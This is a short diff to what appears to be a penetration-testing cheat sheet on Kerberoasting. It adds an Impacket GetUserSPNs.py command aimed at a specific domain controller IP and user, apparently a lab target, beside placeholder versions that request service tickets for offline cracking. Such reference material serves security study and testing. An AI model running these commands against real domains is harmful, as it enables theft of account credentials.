@@ -55,6 +55,9 @@ With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
 ```
 ```sh
+python GetUserSPNs.py -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith
+```
+```sh
 python GetUserSPNs.py -request -dc-ip 10.10.10.175 domainname
 ```
 
